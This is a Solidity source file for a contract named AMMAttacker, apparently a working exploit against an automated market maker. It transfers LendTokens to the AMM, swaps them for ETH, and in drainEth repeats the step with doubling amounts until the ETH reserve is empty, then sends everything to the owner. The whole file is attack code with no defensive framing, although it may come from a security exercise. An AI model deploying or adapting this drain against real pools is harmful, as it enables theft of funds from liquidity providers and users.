// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IAMM {
    function swapLendTokenForEth(address to) external returns (uint ethAmountOut);
    function lendToken() external view returns (IERC20);
    function ethReserve() external view returns (uint256);
}

contract AMMAttacker {
    IAMM public amm;
    IERC20 public lendToken;
    address public owner;

    // Events for debugging
    event AttackStep(uint256 step, uint256 ethReceived);
    event EthReceived(uint256 amount);

    constructor(address _ammAddress) {
        amm = IAMM(_ammAddress);
        lendToken = amm.lendToken();
        owner = msg.sender;
    }

    // Fallback function to receive ETH from the AMM
    receive() external payable {
        emit EthReceived(msg.value);
    }

    // Main attack function to drain ETH from the AMM
    function attack(uint256 lendTokenAmount) external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(lendTokenAmount > 0, "Amount must be greater than zero");

        // Step 1: Ensure attacker has enough LendTokens
        uint256 attackerBalance = lendToken.balanceOf(address(this));
        require(attackerBalance >= lendTokenAmount, "Insufficient LendToken balance");

        // Step 2: Donate LendTokens to the AMM
        lendToken.transfer(address(amm), lendTokenAmount);

        // Step 3: Swap the "donated" LendTokens for ETH
        uint256 ethReceived = amm.swapLendTokenForEth(address(this));
        emit AttackStep(1, ethReceived);

        // Step 4: Transfer received ETH to the owner
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }

    // Function to repeatedly attack until ETH reserves are drained
    function drainEth(uint256 initialLendTokenAmount) external {
        require(msg.sender == owner, "Only owner can drain");
        uint256 lendTokenAmount = initialLendTokenAmount;
        uint256 ethReserve = amm.ethReserve();

        uint256 step = 0;
        while (ethReserve > 0 && lendToken.balanceOf(address(this)) >= lendTokenAmount) {
            // Donate LendTokens
            lendToken.transfer(address(amm), lendTokenAmount);

            // Swap for ETH
            uint256 ethReceived = amm.swapLendTokenForEth(address(this));
            emit AttackStep(step, ethReceived);

            // Update ETH reserve
            ethReserve = amm.ethReserve();

            // Double the LendToken amount for the next iteration
            lendTokenAmount *= 2;
            step++;
        }

        // Send all ETH to the owner
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Final ETH transfer failed");
    }

    // Utility function to deposit LendTokens into the attack contract
    function depositLendTokens(uint256 amount) external {
        require(msg.sender == owner, "Only owner can deposit");
        lendToken.transferFrom(msg.sender, address(this), amount);
    }

    // Utility function to withdraw remaining LendTokens
    function withdrawLendTokens() external {
        require(msg.sender == owner, "Only owner can withdraw");
        uint256 balance = lendToken.balanceOf(address(this));
        lendToken.transfer(owner, balance);
    }
}